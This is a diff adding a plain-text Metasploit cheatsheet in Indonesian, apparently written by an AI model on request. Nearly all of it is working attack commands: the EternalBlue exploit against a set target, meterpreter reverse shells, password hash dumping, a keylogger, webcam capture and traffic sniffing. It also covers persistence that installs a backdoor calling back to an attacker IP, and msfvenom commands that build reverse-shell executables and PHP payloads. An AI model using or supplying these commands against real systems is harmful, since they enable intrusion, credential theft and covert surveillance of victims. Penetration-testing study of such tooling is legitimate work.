@@ -1,0 +1,173 @@
+Siap, berikut **Metasploit Cheatsheet** dalam format plain text agar bisa langsung dipakai di file txt.
+
+---
+
+# METASPLOIT CHEATSHEET
+
+1. Dasar Metasploit
+
+---
+
+Jalankan konsol:
+msfconsole
+
+Cari modul exploit:
+search <keyword>
+search type\:exploit name\:ftp
+search cve:2017
+
+Gunakan modul:
+use exploit/windows/smb/ms17\_010\_eternalblue
+
+Lihat info:
+info
+
+2. Setting Target
+
+---
+
+Lihat opsi:
+show options
+
+Set target:
+set RHOSTS <target-ip>
+set RPORT <port>
+set LHOST <attacker-ip>
+set LPORT <port>
+
+Payload list:
+show payloads
+
+Set payload:
+set PAYLOAD windows/meterpreter/reverse\_tcp
+
+3. Eksekusi Exploit
+
+---
+
+exploit
+run
+
+Multi target:
+set RHOSTS 192.168.56.0/24
+
+Background session:
+background
+
+Lihat sesi aktif:
+sessions -i
+
+Masuk kembali:
+sessions -i <id>
+
+4. Meterpreter Commands
+
+---
+
+Informasi sistem:
+sysinfo
+getuid
+ipconfig
+ifconfig
+
+File system:
+ls
+cd
+pwd
+download file.txt
+upload backdoor.exe
+
+Process:
+ps
+migrate <PID>
+kill <PID>
+
+Password dump:
+hashdump
+
+Akses shell:
+shell
+
+5. Privilege Escalation
+
+---
+
+Coba auto privilege escalation:
+getsystem
+
+Exploit suggester:
+use post/multi/recon/local\_exploit\_suggester
+set SESSION 1
+run
+
+6. Pivoting dan Persistence
+
+---
+
+Pivot ke host lain:
+run autoroute -s 192.168.1.0/24
+
+Persistence (backdoor otomatis):
+run persistence -U -i 5 -p 4444 -r <attacker-ip>
+
+7. Post-Exploitation
+
+---
+
+Screenshot:
+screenshot
+
+Keylogger:
+keyscan\_start
+keyscan\_dump
+
+Webcam:
+webcam\_list
+webcam\_snap
+
+Sniff traffic:
+sniffer\_interfaces
+sniffer\_start 1
+sniffer\_dump 1
+
+8. Contoh Exploit EternalBlue (MS17-010)
+
+---
+
+use exploit/windows/smb/ms17\_010\_eternalblue
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.8
+set PAYLOAD windows/x64/meterpreter/reverse\_tcp
+exploit
+
+9. MSFvenom Payload Generator
+
+---
+
+Windows EXE:
+msfvenom -p windows/meterpreter/reverse\_tcp LHOST=<ip> LPORT=4444 -f exe > shell.exe
+
+Linux ELF:
+msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=<ip> LPORT=4444 -f elf > shell.elf
+
+PHP Payload:
+msfvenom -p php/meterpreter/reverse\_tcp LHOST=<ip> LPORT=4444 -f raw > shell.php
+
+Listener di Metasploit:
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse\_tcp
+set LHOST <ip>
+set LPORT <port>
+exploit
+
+10. Tips Penting
+
+---
+
+* Workflow standar: search → use → set → exploit.
+* Selalu set LHOST ke IP attacker (Kali).
+* Gunakan background untuk multi session.
+* Kombinasikan dengan msfvenom untuk payload custom.
+* Jalankan exploit suggester untuk mencari privilege escalation.
+
+---
